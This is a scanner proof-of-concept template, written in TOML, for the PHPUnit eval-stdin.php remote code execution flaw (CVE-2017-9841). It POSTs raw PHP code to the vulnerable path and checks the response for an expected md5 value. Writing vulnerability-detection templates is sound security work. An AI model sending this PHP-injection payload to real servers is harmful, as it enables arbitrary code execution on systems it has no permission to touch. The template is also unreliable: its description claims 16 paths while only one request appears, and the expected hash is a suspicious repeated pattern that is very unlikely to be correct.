[info]
author = "ave"
description = "向目标 PHPUnit eval-stdin.php 路径发送包含 PHP 代码的 POST 请求，通过检测响应中是否包含指定 PHP 函数执行结果（如 md5 哈希值）来判断漏洞是否存在。覆盖 16 种常见部署路径。"
id = "POC-AVE-2017-1309"
name = "PHPUnit eval-stdin.php 远程代码执行漏洞 PoC"
severity = "critical"
tags = [
    "cve-2017-9841",
    "phpunit",
    "rce",
]
vuln_id = [
    "CVE-2017-9841",
    "AVE-2017-1309",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
protocol = "http"

[poc.requests.body]
content = "<?php echo md5('CVE-2017-9841');?>"
type = "raw"

[poc.requests.headers]
Content-Type = "text/html"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["b6a0b552e6c8e0e0e6a0b552e6c8e0e0"]

